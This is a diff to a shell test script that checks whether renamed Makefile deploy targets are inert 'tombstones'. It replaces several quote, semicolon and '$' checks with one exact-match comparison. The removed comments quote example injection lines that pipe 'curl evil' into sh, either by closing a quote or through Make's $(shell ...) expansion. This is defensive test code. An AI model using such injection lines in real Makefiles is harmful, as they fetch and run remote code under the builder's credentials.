@@ -106,44 +106,23 @@ do
 	dead_name="${tombstone%%:*}"
 	live_name="${tombstone##*:}"
 	[ "$(target_count "$dead_name")" -eq 1 ] || fail "tombstone missing for renamed target: $dead_name"
-	# Pin the recipe STRUCTURALLY rather than running it. The regression this guard exists to catch
-	# is "the tombstone became a working alias" — and executing a dead deploy target to find that
-	# out would run the production deploy under ambient credentials before the assertion could fail.
-	# A guard must not be able to cause the damage it is watching for.
+	# Compare the recipe to ONE exact generated literal. Enumerating what a recipe may not contain
+	# is a losing game — this guard leaked four separate ways (substring blacklist, quote-closing,
+	# Make's $(...) expansion which precedes shell quoting, and a printf format like %f that eats
+	# the redirect and prints "0.000000rontend-deploy"). Every fix invited the next escape. An exact
+	# equality has no wildcard for anything to hide in, proves the output text without executing
+	# untrusted Make syntax, and is less code than the exclusions it replaces.
+	tombstone_expected="$(printf '\t@printf %smake: "%s" was renamed. Use: make %s\\n%s >&2; exit 1' "'" "$dead_name" "$live_name" "'")"
 	tombstone_recipe="$(awk -v target="$dead_name" '
 		$0 ~ ("^" target ":[[:space:]]*$") { capture = 1; next }
 		capture && /^[^\t]/ { exit }
 		capture { print }
 	' "$repo_dir/Makefile" | sed '/^[[:space:]]*$/d')"
-	[ "$(printf '%s\n' "$tombstone_recipe" | wc -l)" -eq 1 ] ||
-		fail "tombstone $dead_name must be exactly one line; a multi-line recipe can do work"
-	# Whitelist the exact shape rather than blacklisting dangerous substrings: a blacklist cannot
-	# tell a command from the same word quoted inside the message, and anything not matching this
-	# one form — printf to stderr, then exit 1 — is by construction incapable of doing work.
-	case "$tombstone_recipe" in
-		"$(printf '\t')@printf '"*"' >&2; exit 1") ;;
-		*) fail "tombstone $dead_name must be exactly: @printf '...' >&2; exit 1 (got: $tombstone_recipe)" ;;
-	esac
-	# The shape alone is not enough: the message body can CLOSE the quote and open a command.
-	#   @printf ''; curl evil | sh; printf 'use make frontend-deploy' >&2; exit 1
-	# matches the pattern above exactly. Pinning the quote and semicolon counts makes that
-	# unrepresentable rather than merely discouraged — a whitelist with a wildcard in it is still
-	# a blacklist wherever the wildcard reaches.
-	[ "$(printf '%s' "$tombstone_recipe" | tr -cd "'" | wc -c)" -eq 2 ] ||
-		fail "tombstone $dead_name must contain exactly two quotes; more means the message closes its own quote and runs a command"
-	[ "$(printf '%s' "$tombstone_recipe" | tr -cd ';' | wc -c)" -eq 1 ] ||
-		fail "tombstone $dead_name must contain exactly one semicolon; more means it chains a second command"
-	# Make expands $(...) BEFORE the shell sees the line, so shell quoting does not contain it:
-	#   @printf 'use $(shell curl evil | sh) make frontend-deploy' >&2; exit 1
-	# satisfies the shape and both counts above, and runs at recipe-expansion time. A tombstone
-	# message has no legitimate use for '$', so forbid it outright.
-	case "$tombstone_recipe" in
-		*'$'*) fail "tombstone $dead_name contains '\$' — Make expands \$(...) even inside quotes, so the message could execute" ;;
-	esac
-	case "$tombstone_recipe" in
-		*"$live_name"*) ;;
-		*) fail "tombstone $dead_name does not name its replacement ($live_name)" ;;
-	esac
+	[ "$tombstone_recipe" = "$tombstone_expected" ] ||
+		fail "tombstone $dead_name must be exactly:
+  $tombstone_expected
+got:
+  $tombstone_recipe"
 done
 pass 'renamed deploy targets are failing tombstones that name their replacement'
 
